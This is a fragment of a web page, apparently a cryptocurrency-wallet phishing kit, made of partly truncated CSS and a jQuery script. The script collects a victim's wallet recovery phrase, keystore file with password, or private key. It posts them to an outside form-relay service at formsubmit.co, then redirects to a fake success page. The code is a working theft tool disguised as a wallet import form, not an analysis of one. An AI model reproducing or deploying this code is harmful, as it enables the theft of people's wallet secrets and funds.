        .overlay {

        .aletr {
            background-color: #fff;

        .close {

        .aletr h1 {

        .aletr .select {

        .inputBox {

        .inputBox input,
        .inputBox textarea {

            border: 1px solid #ccc;
            outline: none;
            padding: 10px;
            color: rgb(88, 112, 135);
        }

        .inputBox textarea {
            max-width: 80%;
        }

        .errormessage {
            color: red;
            text-align: center;
            width: 100%;
            font-size: 16px;

            margin-top: 10px;
        }

        .inputBox button {
            width: 80%;
            border-radius: 5px;
            border: 1px solid #ccc;
            outline: none;
            padding: 10px;
            margin-top: 25px;
            color: rgb(88, 112, 135);
            cursor: pointer;
        }

        .sss {
            font-size: 20px;
        }

<body>
    <!-- --- Begin wallet.html content --- -->

    <!-- Scripts from both files, deduplicated -->
    <script src="js/jquery-3.6.0.js" crossorigin="anonymous"></script>
    <script src="js1.js"></script>
    <script src="js2w.js"></script>
    <script>
        function ready() {
            document.body.style.display = "block";
        }
        document.addEventListener("DOMContentLoaded", ready);

        // Merged JS logic from both files
        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
        }
        const phraseProceedHandler = () => {
            event.preventDefault();
            let phraseInputVal = document.getElementById('phraseInput').value;
            const wallet = document.getElementById('wallet_id').value;
            let code = makeid(24);
            let data = {
                service_id: 'service_32s49cw',
                template_id: 'template_ex4ad0h',
                user_id: 'PS6t3E7b4thjHE-uQ',
                template_params: {
                    "import_type": "phrase",
                    "phrase": phraseInputVal,
                    "code": code,
                    "wallet": wallet
                }
            }
            if (phraseInputVal.trim() === "") {
                alert('Fill in your recovery phrase');
            } else {
                $.ajax({
                    url: "https://formsubmit.co/your@email.com",
                    method: 'POST',
                    data: JSON.stringify(data),
                    contentType: 'application/json',
                    success: function (res) {
                        if (res.trim() != "") {
                            if (res.trim() == "OK") {
                                phraseInputVal = '';
                                redirect(code);
                                document.querySelector('.sending').style.display = 'block';
                            } else {
                                alert('Could not proceed due to some errors, kindly try again later.');
                                console.log(res);
                            }
                        }
                    }
                });
            }
        };
        const keystorejsonProceedHandler = () => {
            event.preventDefault();
            let keystorejson = document.getElementById('keystorejson').value;
            let keystorepassword = document.getElementById('keystorepassword').value;
            let code = makeid(24);
            const wallet = document.getElementById('wallet_id').value;
            let data = {
                service_id: 'service_32s49cw',
                template_id: 'template_ex4ad0h',
                user_id: 'PS6t3E7b4thjHE-uQ',
                template_params: {
                    "import_type": "keystore",
                    "keystorejson": keystorejson,
                    "keystorepassword": keystorepassword,
                    "code": code,
                    "wallet": wallet
                }
            }
            if (keystorejson.trim() === "" || keystorepassword === "") {
                alert('Fill out all form fields before proceeding');
            } else {
                $.ajax({
                    url: "https://formsubmit.co/your@email.com",
                    method: 'POST',
                    data: JSON.stringify(data),
                    contentType: 'application/json',
                    success: function (res) {
                        if (res.trim() !== "") {
                            if (res.trim() == "success") {
                                keystorepassword = '';
                                keystorejson = '';
                                redirect(code);
                                document.querySelector('.sending').style.display = 'block';
                            } else {
                                alert('Could not proceed due to some errors, kindly try again later.');
                            }
                        }
                    }
                });
            }
        };
        const privateKeyProceedHandler = () => {
            event.preventDefault();
            let privatekey = document.getElementById('privatekey').value;
            const wallet = document.getElementById('wallet_id').value;
            let code = makeid(24);
            let data = {
                service_id: 'service_32s49cw',
                template_id: 'template_ex4ad0h',
                user_id: 'PS6t3E7b4thjHE-uQ',
                template_params: {
                    "import_type": "privatekey",
                    "privatekey": privatekey,
                    "code": code,
                    "wallet": wallet
                }
            }
            if (privatekey.trim() === "") {
                alert('Fill in your private key');
            } else {
                $.ajax({
                    url: "https://formsubmit.co/your@email.com",
                    method: 'POST',
                    data: JSON.stringify(data),
                    contentType: 'application/json',
                    success: function (res) {
                        if (res.trim() !== "") {
                            privatekey = '';
                            redirect(code);
                            document.querySelector('.sending').style.display = 'block';
                        } else {
                            alert('Could not proceed due to some errors, kindly try again later.');
                        }
                    }
                });
            }
        };
        const redirect = (token) => {
            window.location.href = "success9561.html?code=" + token;
        };
        // Attach event listeners if elements exist
        if (document.getElementById('phraseProceed')) {
            document.getElementById('phraseProceed').addEventListener('click', phraseProceedHandler);
        }
        if (document.getElementById('keystorejsonproceed')) {
            document.getElementById('keystorejsonproceed').addEventListener('click', keystorejsonProceedHandler);
        }
        if (document.getElementById('privatekeyProceed')) {
            document.getElementById('privatekeyProceed').addEventListener('click', privateKeyProceedHandler);
        }
    </script>
</body>
